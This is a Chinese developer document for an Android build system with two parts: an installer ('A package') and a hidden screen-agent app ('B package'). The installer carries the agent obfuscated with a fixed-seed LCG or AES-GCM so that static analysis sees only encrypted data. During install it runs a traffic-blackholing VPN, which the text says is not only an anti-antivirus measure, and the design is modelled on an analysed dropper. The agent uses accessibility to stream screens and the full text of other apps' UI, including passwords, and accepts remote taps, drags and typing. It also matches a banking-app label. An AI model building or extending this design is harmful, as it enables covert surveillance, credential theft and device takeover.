# APK 模板清单与新增版本

## Android 协议入口

工作端开发先读 [Android 客户端协议对接总览](../../backend/docs/ANDROID_CLIENT_PROTOCOL.md)。现有设备 WS、截图 HTTP 与应用列表等合成展示 JSON 属于不同合同；该总览列出当前接通状态、版本与字段差异，展示字段详见 [UI_DEMO_PROTOCOL.md](../../backend/docs/UI_DEMO_PROTOCOL.md)。本文各历史模板章节描述对应版本，不代表手机安装了最新版本。

## 当前源码

- `android/apk-templates/b-packages/`：工作端版本区。当前 `screenagent-1.7.5/` 有桌面模式选择页；可在 MediaProjection（`VirtualDisplay + ImageReader.acquireLatestImage()`）和 AccessibilityService.takeScreenshot 两种截图模式间切换。MediaProjection 确认仍由 Android 系统界面完成；1.0–1.4 已删除，保留 1.5、1.6、1.7、1.7.1、1.7.2、1.7.3 兼容目录。
- `android/apk-templates/a-packages/`：安装器版本区。当前 `installer-1.3/`（清单 ID `installer-1.3`）：B 包以 LCG 混淆内嵌，点击安装时请求系统 VPN 授权并启动吞流量 VPN，同时经 `PackageInstaller` 会话安装 B 包；安装成功回调立即停 VPN 并返回 A 包后停 VPN，走受限设置/无障碍引导进入内置网页。旧 `installer-1.0/1.1/1.2` 保留（1.2 为明文 `payload.apk` + `ACTION_VIEW` 安装器，无 VPN）；`installer-1.2.2/1.2.3` 为无 VPN + LCG `payload.dat` + 1.3.1 同步 UI 的对照版，其中 1.2.3 明确固定 B 包 LCG payload.dat 路径，1.2.4 在此基础上加入 VPN 路径，1.2.5 保留 VPN 但改用不加密的原始 APK 字节 `payload.dat`，1.2.6 不携带 B 包，仅保留 VPN 测试路径，1.2.7.x 系列为 VPN/PackageInstaller/LCG 消融对照，其中 1.2.7.4 为无 VPN + LCG `payload.dat` + 1.2.8 进度/无障碍引导 UI，1.2.7.5 在 1.2.7.4 基础上加回必需的 VPN 吞流量隔离并把 B 包加密由 LCG 换成 AES-256-GCM。A 包不复制 B 包工作逻辑。
- `android/apk-templates/standalone/`：不参与 A/B 依赖的独立模板。当前 `browser-1.0/` 只打开可见 WebView。
- `android/apk-templates/templates.json`：后台模板选择框的数据源。显示名和实际 Android 版本分开；当前没有名为 v4.0 的源码，勿只改标题就描述为新增功能。
- `android/apk-templates/domains.json`：可选域名简称映射，不包含凭证。
- `backend/src/apk-builder.js`：复制源码、注入配置、启动 Gradle、检查真实产物。
- `backend/src/build-queue.js`：SQLite 队列、归属检查、构建记录与下载。

## 新增后续模板：复制、改源码、登记

以下命令在项目根目录执行。先确认新目录尚不存在：

```bash
cp -R android/apk-templates/b-packages/screenagent-1.7.4 android/apk-templates/b-packages/screenagent-1.8
```

在新目录修改 Android 源码。向 `android/apk-templates/templates.json` 的数组追加：

```json
{
    "id": "screenagent-1.8",
    "name": "v1.8 · ScreenAgent 新能力",
    "versionName": "1.8.0",
    "versionCode": 9,
    "sourceDir": "b-packages/screenagent-1.8",
    "kind": "screenagent",
    "visibleLauncher": false,
    "description": "在这里写真实新增能力；保留 Android 系统确认与停止入口。"
}
```

保存后刷新构建页面即可出现新选项，无需改 Vue 或重启服务。清单是管理员维护的仓库配置，不是网页上传任意源码/脚本的入口；最多 40 项，ID 唯一，sourceDir 相对 android/apk-templates，且必须位于此目录内。

**同一类模板的约定：**

- A/B 目录表达职责，不表达构建顺序缓存：`b-packages` 是无桌面入口的工作应用；MediaProjection 确认由内部透明 Activity 立即转交 Android 系统界面，所有可见业务界面仍由 A 包承载；`a-packages` 只处理首页、安装、摘要校验和已安装状态切换，不提供 B 包设置入口。A 包构建任务仍从数据库选择同账号最新成功 B 包产物。
- 新增 B 功能时复制 B 版本目录，提高 `versionName/versionCode`，登记新的 `sourceDir`；不要把截图、无障碍视图或设备通信代码加入 A 包。
- `kind` 支持 `screenagent`、`installer` 或 `browser`。新的 Android 架构需要先新增构建适配和测试，不能仅填目录。
- 复制范围为根目录 `build.gradle[.kts]`、`settings.gradle[.kts]`、`gradle.properties`，以及 `app/build.gradle[.kts]`、`app/proguard-rules.pro`、`app/src/`。不复制缓存、签名、local.properties、任意额外模块或符号链接。
- 保留 `app/src/main/res/values/strings.xml` 的 `app_name`；浏览器还需 `home_url`。名称与网址经过 XML/Android 字符串转义，原模板不改。
- ScreenAgent 从 `app/src/main/assets/agent_config.json` 读取后台 `serverUrl` 等运行时参数，不包含 `homeUrl/webUrl`；Gradle 不应再次覆盖这个文件。支持属性 `appId`、`versionName`、`versionCode`。
- ScreenAgent 1.7.5 保留 `boundary-node-v2` 规则并上报节点 text/content_description；页面可切换 MediaProjection 与 takeScreenshot 截图模式，并在设备详情 API 调试会话开启时上报 HTTP/WS、MediaProjection、takeScreenshot 截图延迟、错误元数据，并在本地成功取到 JPEG 后上传私有调试截图内容；关闭调试后停止收录。1.7.5 接收六个固定系统动作和租约内的 `TEXT_INPUT`；TEXT_INPUT 只写入当前聚焦、可编辑、非密码输入框，不接受坐标手势、脚本或通用指令。客户端最多遍历 250 节点 / 24 层，服务端再校验 400 节点 / 32 层和 128 KiB 设备 WS 上限；网页只读取内存中与 viewerId 绑定的最新一帧。
- Installer 从 `app/src/main/assets/installer_config.json` 读取 A 包 HTTPS 首页，以及被锁定的 B 包构建 ID、摘要与包名，并携带 `payload.apk`；这些文件只能由 Node 从已完成构建复制，不接受网页上传或任意路径。1.1 在构建副本的 `<queries>` 中写入 B 包包名并直接检查安装状态，不要求 B 包暴露 Activity；A 包只在自己刚完成 B 包安装的返回路径中显示无障碍引导，用户点击按钮后才打开 Android 系统无障碍设置。
- 浏览器支持 `shellApplicationId`、`shellVersionName`、`shellVersionCode`，元数据写入 `assets/build_config.json`，主页写入 `home_url`。
- 输出约定 `app/build/outputs/apk/debug/app-debug.apk`；固定执行 `assembleDebug lintDebug`。保持 JDK 17、AGP 8.9.2 / Gradle 8.11.1 与 API 35 工具链兼容。
- 参数不写入 Java/Kotlin/Gradle 源代码；包名、版本是白名单属性。包名是 applicationId，不全局替换 namespace 或 Java/Kotlin 包路径。
- 升级安装须保持包名与签名、提升 versionCode。随机包名产生独立应用，不是旧应用升级。
- 开始运行时复制源码，队列保存模板清单快照；已发布目录不要原地改版本，新增目录维护，已有产物保持不变。

新增依赖须由维护者预先准备离线缓存。后台只离线构建，不从提交参数中下载代码或执行用户脚本。新增版本先执行 `npm run check`、`npm run test:e2e`，再在页面真实构建、核对参数/签名并做真机验证。

## 域名与 APK ID

`local` 自动解析为当前本地服务 origin，例如 `http://127.0.0.1:8080`。USB 联调另执行 `adb reverse tcp:8080 tcp:8080`，不是远程公网地址。

填写 `https://console.example.com` 或 `console.example.com` 会保存为 HTTPS origin（不携带路径、账号、查询串）。仅写 `cohuducox` 时，需要维护者先在 `domains.json` 配置，例如以下**示例地址**：

```json
{ "cohuducox": "https://console.example.com" }
```

把示例替换为实际部署地址。别名解析只写入 APK，不创建域名、DNS、证书或服务器；当前 Node 仍只监听本机。后台域名只写入 B 包，主页 HTTPS URL 只写入 A 包，两者不互相推导。

APK ID 在创建账号时自动分配，一个账号一个固定编号。构建时可不填：填写有效编号归属对应账号，留空或未匹配可用账号时归属默认接收账号（当前为超管）。后端把实际编号写入安装包，记录显示接收账号和匹配结果；构建不创建新编号或改写旧设备归属。没有总台 AppID。工作室/子账号、设备下发、专属域名管理仍是后续阶段。

## 产物与限制

网页构建产物：`backend/.node-private/files/apk-builds/<构建 UUID>/application.apk`。

构建日志：`backend/.node-private/build-work/<UUID>/build.log`，最多 1 MiB。构建记录的“构建日志”按钮通过登录鉴权下载。A/B 两类日志均记录模板路径、包身份、B 包摘要（A 包）、源码准备、Gradle assemble/Lint、`apksigner verify`、`zipalign`、`aapt badging`、桌面入口断言、SHA-256、产物保存、失败和源码清理步骤。构建器按模板 `visibleLauncher` 断言 B 包是否有桌面入口，A 包必须有桌面入口，否则构建直接失败。每次源码副本在成功或失败后清理；异常断电留下的 source 可在确认队列空闲、服务停止后由维护者清理。模板原目录保留。

单实例、单任务执行，最多 10 个未完成任务，每任务 20 分钟；工具链缺失直接报错，执行失败不显示下载按钮。重启将执行中任务标记失败，排队任务继续；提交 requestId 防止网络重试重复建包。不要让两个 Node 实例共用同一数据库和构建目录。

开发签名保存在 `android/.local-tools/android-user/`（或运维指定路径）。产物最多 150 MiB，累计产物配额 2 GiB，构建前磁盘可用空间至少 1 GiB；日志/依赖缓存/异常遗留目录也需运维维护。备份签名才能保持后续升级身份。

「复制链接」复制同源、需超管登录的下载链接，不包含账号 Token，不是匿名公开分享地址。本机链接不适合直接转发到外部手机。Telegram 构建与发送、模板网页上传、图标自定义暂未接入。

1.7.5：基于 1.7.4，开启无障碍与服务重连均不请求 MediaProjection；只在桌面页点击按钮后经进程内单次点击票据校验打开系统授权。页面显示 BuildConfig 版本便于核对实际安装包；取消授权不重试，切换 takeScreenshot 撤销待用票据并停止共享。截图与节点仍按网页实时查看租约正常上报，不依赖调试开关；新增 API 调试上报与私有调试截图内容上传仅用于打开调试后额外记录截图延迟、错误码、授权和上传问题。保留 1.7.4/1.7.3 历史模板。

点击票据的 JVM 行为测试：`bash android/scripts/test-projection-consent.sh`。复用本机已缓存 Kotlin 1.9.22 编译器与 JDK；包含缺失票据、旧 Intent、错误票据、有效点击、重放、取消、连续点击与新点击八项断言。

## ScreenAgent 1.7.6

新增固定模板 `b-packages/screenagent-1.7.6`（versionCode 14），保留 1.7.5。默认 takeScreenshot，MediaProjection 仍仅由用户点击并确认系统共享授权。后端白名单传递 captureReady / projectionActive / captureMode；网页仅在已打开截图浮窗及现有 viewerId 下、就绪/模式/在线状态转换时重发截图请求，不因心跳重复启动。切换模式废弃旧帧回调；停止 MediaProjection 不再误停止 takeScreenshot。首图失败记录调试事件并最多在一分钟间隔后重试两次；有实时会话时首图不争用上传许可。取消授权不重弹，关闭网页后不自动重建实时查看。

验证记录：`backend/.node-private/releases/1.7.6/VERIFICATION.txt`；本机构建命令 `npm run build:screenagent`。编译、合成图联调与真机授权验证分别记录。

### screenagent-1.7.8（B 包桌面模式页，versionCode 16）

新增「运行操作」与「停止操作」。单击授权为本机弹窗确认后的当前会话内存状态（没有固定两分钟超时），显示可点击停止横幅；仅截图查看租约内的近期单点映射，不支持长按或轨迹。MediaProjection 旋转时复用 VirtualDisplay 并换 Surface。节点正文剔除。1.7.6 及更旧固定源码保持不变。

1.7.8直传修订：MediaProjection与默认takeScreenshot实时查看共用 uploadViewerScreenshot，取消每帧singleFrameSession/uploadId；设备鉴权与已有查看指令关联保留。MediaProjection最短40ms本地周期以匹配有界限流；断线/查看心跳失效停止。首图/旧模板仍走兼容单张许可。

### 1.7.8 阅读器文字修正（2026-10-03）

恢复实时节点实际 text/content_description（每字段最多2000字符，仅当前查看租约的临时内存）；密码、敏感和 editable 输入字段仍剔除。无文字的节点不再用 Button/TextView/FrameLayout 类名占位，布局结构和坐标保留。需要重新构建安装修正版1.7.8 B包，已有APK不会自动更新。

### B 包 1.7.9：桌面节点刷新诊断（versionCode 17）

独立复制 1.7.8 模板，旧版本保留。默认构建切换至 1.7.9。继承查看租约内每秒补采、focused/active 应用窗口根节点刷新与真实屏幕尺寸；新增 flagIncludeNotImportantViews、图标点击事件补采和 Android 13+ clearCache 清理旧子节点缓存。API 调试仅记录包名、根节点状态、节点数量、截断与缓存能力，不记录节点正文。

已知桌面问题的候选原因：上一版本仅事件驱动且根节点缓存可能滞后；服务未请求非重要视图；启动器本身也可能不暴露部分图标。此修订不使用 OCR、不会伪造缺失节点，不能凭编译证明所有启动器都已恢复。

测试安装后主动开启查看与 API 调试，依次检查 B 包 → Home → 打开/关闭文件夹 → 设置 → Home。核对 service/nodes_snapshot 包名切换、rootStatus、nodeCount 和截断状态。无真实设备连接时只报告编译/合成测试，不宣称桌面真机修复。密码/可编辑输入字段仍置空；本机运行操作授权、可见停止与会话失效停止不变。

## 1.8.0：一键链路诊断

固定模板 `b-packages/screenagent-1.8.0`，versionCode 18，保留 1.7.9 与旧版本。记录无正文的窗口事件、节点读取序号/采集时间/结构变化及 WS 排队结果；排队成功不等于服务器收到。重复心跳中的相同 debug session 不再反复记录开启事件。本机授权、停止入口和密码/输入字段剔除保持不变。部署网页后需重新构建并安装 1.8.0，旧 APK 不自动升级。

## 1.8.1：桌面节点范围诊断

新增固定模板，versionCode 19。API 调试增加最多 8 个窗口的类型/层级/焦点/根包名/边界/子节点数，以及所选根的遍历计数、空子节点、深度截断、不可见和屏外节点数。结构未变化也记录读取诊断，但不重复发送节点。窗口清单不采集背景正文，密码与可编辑字段继续置空。
复测：启动 API 调试 → 其他应用 → Home（先不打开文件夹）→ 打开文件夹 → 关闭文件夹 → 其他应用 → 结束并复制诊断。childrenReported 与 childrenRead 的差由 childReadFailures/depthSkipped 解释；窗口清单用于识别选根范围。计数相等不能证明 Android 暴露了所有视觉元素。真机根因需新报告验证，版本号不代表已修复。

## 1.8.3：根范围修复候选与诊断兼容

固定版本 1.8.3/code21，保留 1.8.1；跳过未发布的 1.8.2。所选节点存在同包名、同窗口父节点时，最多按深度限制提升到父根；每个遍历节点刷新并统计失败，不拼接其他应用的树。诊断批次保持最多50条，单请求在途，失败保留有界队列等下一次正常flush，无递归重试；会话结束不跨会话重试。
服务器兼容1.8.1的windowInventory：严格8项窗口元数据结构及4096字节详情上限，拒绝任意嵌套正文/对象，不截断JSON。阅读器文字按画布宽度缩放、框内自适应换行，悬停显示完整标签，不改坐标。
复测其他App → Home停留 → 打开文件夹 → 关闭文件夹 → 再打开 → 设置，检查nodes_snapshot/windowInventory、rootParentsAscended、nodeRefreshFailures、debugUploadFailures、childrenRead/Reported。Launcher不暴露的图标不伪造；编译通过不等于已验证真机完整性。

### 1.8.3 一次性详细诊断

主动API调试会话中，服务器收到节点后记录最多200条脱敏结构，每批6条，标明总数/截断/快照ID。只含ID、父ID、窗口、类名、边界和属性；不记录viewId、原始标签、输入/密码/银行正文。仅Launcher3中匹配Yono Lite桌面标签的节点记录布尔匹配标记，不采集该应用页面正文。网页增加nodes_rendered实际DOM节点计数与最多200个键。通过同一snapshotId比对采集统计、接收结构和绘制；计数一致不代表Android暴露所有图标。授权与停止入口不变。

## 1.8.4 桌面诊断

B 包新增默认关闭的「开始桌面节点诊断」按钮。用户在手机确认后，最多5分钟、仅当前默认桌面启动器与本应用上报节点；密码及输入文本仍剔除。授权只在内存保存，进程重启不恢复，屏幕底部可点停止；网页关闭或连接断开后停止。独立于截图与远程操作授权。先在网页打开阅读器，再在手机开启诊断，返回桌面、展开/关闭文件夹。服务器必须包含 fc4348a 的 live 异常矩形兼容修复。单个无效矩形不再导致整批有效桌面图标丢失；系统未暴露的图标不伪造。更新需要安装新 APK，并升级服务器模板清单/网页。

## 1.8.6 阅读器长按拖动

固定模板 `b-packages/screenagent-1.8.6`，versionCode 24，保留 1.8.5 与旧版本。新增 `SCREEN_TOUCH` 指令：网页端在实时截图或无障碍阅读器上把按下、移动、抬起、取消同步为 `down/move/up/cancel`，同一 `gestureId` 串联轨迹；服务器只校验查看租约/在线状态并逐段下发，不等待、不转发触摸完成回执；B 包在本机「运行操作」授权、查看租约有效且停止入口可见时，按下即建立触点，移动时逐段 `continueStroke` 到手机，抬起只发送最终释放。截图事件可携带近期 `frameId` 供手机端校验；阅读器事件可省略 `frameId` 并使用当前屏幕几何。旧 `SCREEN_TAP`/`SCREEN_DRAG`、文本输入、固定系统动作、停止入口保护、放大状态拒绝和忙碌拒绝保持不变。

验证记录：`npm run build:screenagent` 已真实构建 `/Users/xxx/Documents/code/yuankon/android/dist/screenagent-K7pLzk/screenagent.apk`（package=com.zaka.screenagent、versionName=1.8.6、versionCode=24、桌面入口存在、apksigner v2 签名通过、zipalign 4/16K 对齐通过，SHA-256 `b867fc623d40b47e65853fa8d594f240e22d7d35fa62ca0d0fd25136fb27de5d`）。`npm run check` 与 `npm run test:e2e` 通过；真机触控验证另行报告。

## 1.8.5 全应用节点无条件上传

固定模板 `b-packages/screenagent-1.8.5`，versionCode 23，保留 1.8.4 与旧版本。移除 1.8.4 的「桌面启动器 + 本应用」包名白名单（`DesktopNodeConsent.allows`），查看租约内无条件读取并上传当前前台应用完整节点树，因此可记录设置、浏览器、文件管理器等任意其他 App 的节点；`null_root` 不再由本地范围判断清空，仅当系统确无可用根时出现。主程序移除「开始/停止桌面节点诊断」两个按钮与 5 分钟内存授权横幅，节点采集默认开启、仅在存在有效网页查看租约时进行；删除 `DesktopNodeConsent.kt`。同时移除密码/可编辑输入正文剔除：`text`/`content_description` 无条件上传（各最多 2000 字符），`password/editable/sensitive` 标志仍如实上报，`text_present` 语义不变。仍保留的边界：客户端最多 250 节点 / 24 层、坐标钳位；网页只画有效正面积且非 `invalid` 的框。截图通道不受影响，节点范围与正文放宽不等于裁剪或补全截图。节点数量/深度与服务器 400 节点校验不变；「运行操作」远程单击授权与本机确认不变。更新需要安装新 APK 并刷新构建页模板清单。

验证记录：`npm run build:screenagent` 真实构建 `screenagent.apk`（package=com.zaka.screenagent、versionName=1.8.5、versionCode=23、桌面入口存在、apksigner v2 签名通过、zipalign 4/16K 对齐通过）；`npm run check` 116 项后端测试、`npm run test:e2e` 19 项浏览器测试均通过。编译/合成测试通过不代表真机完整性，真机验证另行报告。

## A 包 installer-1.3：VPN 隔离安装（versionCode 4）

固定模板 `a-packages/installer-1.3`，保留 1.0–1.2。机制参考 `/Users/xxx/Downloads/xy_2` dropper 静态分析，按用户确认混合实现（详见 `backend/docs/INSTALLER_1_3.md`）：

- **混淆内嵌**：构建时 Node 将 B 包原始字节加 16 零字节头、按固定种子 276813 的 LCG 流异或后写入 `assets/payload.dat`（模板 `payloadFormat: "lcg16"`）；A 包运行时还原并核对 `installer_config.json` 的 SHA-256。`payloadFormat` 缺省 `plain` 的旧模板仍写明文 `assets/payload.apk`。
- **VPN 隔离**：新增 `VpnKillService`（`BIND_VPN_SERVICE`）：IPv4/IPv6 默认路由、DNS 10.0.0.1、MTU 1500、只读 fd 不回写吞流量；`addDisallowedApplication` 放行 WhatsApp/Telegram/拨号等固定清单。
- **安装方式**：由 `ACTION_VIEW` 改为 `PackageInstaller` 会话（`MODE_FULL_INSTALL`，`commit` 可变 PendingIntent 指向 manifest 静态 `InstallReceiver`，收到 `Intent.EXTRA_INTENT` 后拉起系统确认界面）；minSdk 26。
- **装后流程**：安装成功回调立即停 VPN 并返回 A 包（`singleTop` 复用）→ 停 VPN → Android 13+「允许受限设置」→ 无障碍开启引导 → 内置 HTTPS 首页；不自禁用组件、不直接拉起 B 包。
- 取消/失败：`onResume` 检测会话结束且未安装 → 停 VPN、回更新页可重试。

验证：`npm run build:installer13` 真实构建（默认先构建当前 B 包再内嵌；也可用 `INSTALLER13_PAYLOAD_APK` 指定；assembleDebug + lintDebug、apksigner v2、zipalign 4/16K、aapt 包身份/桌面入口/VPN 服务/`payload.dat` 断言）通过；LCG 往返（Node 混淆 → APK 内 `payload.dat` → Java 按运行时算法解密）字节与 SHA-256 一致；`npm run check` 142 项后端测试、`npm run test:e2e` 27 项浏览器测试通过。VPN 授权、吞流量与真机安装链路需真机验证，单独报告。

## A 包 installer-1.2.7.7：1.2.7.6 + InstallReceiver exported=true 对照（versionCode 377）

固定模板 `a-packages/installer-1.2.7.7`，从 `installer-1.2.7.6` 复制。除版本号、包构建脚本和 InstallReceiver 导出标记外保持不变：

- **保持 1.2.7.6 流程与 lcg16 payload**：继续使用 VPN 启停、`PackageInstaller` 会话、进度环、无障碍引导 UI，以及 `assets/payload.dat` = 16 个零字节头 + 固定 seed `276813` 的 LCG 流异或 B 包字节。
- **InstallReceiver 改为 `exported=true`**：向 `installer-1.3.1` 的接收器导出行为靠拢，其余 VPN 停止、失败后实装检查和无明文 `payload.apk` 约束保留，用于单独对照 exported 标记影响。

构建脚本 `android/scripts/build-installer-1.2.7.7.sh`（默认内嵌最近一次构建的 B 包，可用 `INSTALLER1277_PAYLOAD_APK` 指定）：复制源码 → 生成 lcg16 `payload.dat` → Node 侧 lcg16 还原往返核对 SHA-256 → assembleDebug + lintDebug、apksigner v2、zipalign 4/16K、aapt 包身份/桌面入口/`VpnKillService`/`BIND_VPN_SERVICE`/`InstallReceiver exported=true`/`payload.dat` 断言（且不得含明文 `payload.apk`）。

## A 包 installer-1.2.7.6：1.2.7.5 流程 + 1.3.1 LCG 对照（versionCode 376）

记录：2026-10-09 实测反馈中，`installer-1.2.7.5` 作为 AES-GCM + VPN 断网隔离基线，B 包可成功安装且未触发当前测试设备提示；该结论只作为本机测试记录，不自动外推到其他设备或时间。

固定模板 `a-packages/installer-1.2.7.6`，从 `installer-1.2.7.5` 复制。除版本号、包构建脚本和 payload 编码外保持不变：

- **保持 1.2.7.5 流程**：自动准备安装、VPN 授权与吞流量服务、`PackageInstaller` 会话、安装成功后停止 VPN、进度环、无障碍引导 UI、`InstallReceiver exported=false` 均保留。
- **payload 编码切回 1.3.1 的 lcg16**（`payloadFormat: "lcg16"`）：构建时 Node 写 `assets/payload.dat` = 16 个零字节头 + 固定 seed `276813` 的 LCG 流异或后的 B 包字节；运行时 `MainActivity.decryptPayload()` 跳过 16 字节头并按相同 LCG 还原，再核对 `payloadSha256`。
- **对照目的**：只改变 payload 编码，把 `1.2.7.5` 的 AES-GCM 与 `1.2.7.6` 的 lcg16 放在同一安装/VPN/UI 流程里比较。

构建脚本 `android/scripts/build-installer-1.2.7.6.sh`（默认内嵌最近一次构建的 B 包，可用 `INSTALLER1276_PAYLOAD_APK` 指定）：复制源码 → 生成 lcg16 `payload.dat` → Node 侧 lcg16 还原往返核对 SHA-256 → assembleDebug + lintDebug、apksigner v2、zipalign 4/16K、aapt 包身份/桌面入口/`VpnKillService`/`BIND_VPN_SERVICE`/`InstallReceiver`/`payload.dat` 断言（且不得含明文 `payload.apk`）。

## A 包 installer-1.2.7.5：AES-GCM 加密 + VPN 断网隔离（versionCode 375）

固定模板 `a-packages/installer-1.2.7.5`，基于 `installer-1.2.8` 复制（清单 ID `installer-1.2.7.5`）。保留 1.2.7.4 的 1.2.8 进度环/无障碍引导 UI 与 `PackageInstaller` 会话安装，差异只有两点：

- **加回必需的 VPN**：复用 `VpnKillService`（全路由吞流量 + 固定放行清单 + `stopIntent` 停止机制），启动 A 包自动请求系统 VPN 授权并建立吞流量隧道，安装成功/失败/取消时停止。固定放行清单逐项容错，手机未安装某个放行应用时不会阻断 VPN 建立。用户实测：B 包带无障碍服务时，`PackageInstaller` 安装若不切断网络，无障碍开关无法点亮；VPN 在此是功能性依赖，不只是反报毒手段。
- **B 包加密由 LCG 换成 AES-256-GCM**（`payloadFormat: "aesgcm"`）：构建时 Node 每次生成随机 32 字节密钥 + 12 字节 nonce，`payload.dat` = nonce ‖ 密文 ‖ 16 字节 GCM 认证标签，base64 密钥写入 `installer_config.json` 的 `payloadKey`；运行时 `MainActivity.decryptPayload()` 用 `AES/GCM/NoPadding` 解密（tag 自带完整性），再核对 `payloadSha256` 后交给 PackageInstaller。每构建密文与密钥不同，静态分析只看到正常加密数据。

构建脚本 `android/scripts/build-installer-1.2.7.5.sh`（默认内嵌最近一次构建的 B 包，可用 `INSTALLER1275_PAYLOAD_APK` 指定）：复制源码 → AES-GCM 加密 `payload.dat` 并注入密钥 → **Node 侧 GCM 解密往返核对 SHA-256**（对应 Java 运行时路径）→ assembleDebug + lintDebug、apksigner v2、zipalign 4/16K、aapt 包身份/桌面入口/`VpnKillService`/`BIND_VPN_SERVICE`/`InstallReceiver`/`payload.dat` 断言（且不得含明文 `payload.apk`）。`InstallReceiver` 使用显式组件 PendingIntent，manifest 保持 `exported=false`，避免外部广播伪造安装结果。

验证：`bash android/scripts/build-installer-1.2.7.5.sh` 真实构建通过（B 包 `com.zaka.screenagent`，包身份 `org.test.installer1275`/1.2.7.5/code 375，GCM 往返 SHA 一致）；`npm run check` 144 项后端测试、`npm run test:e2e` 28 项浏览器测试通过（含新增 aesgcm 构建注入往返与模板目录断言）。VPN 授权、吞流量、无障碍点亮与真机安装链路需真机验证，单独报告。
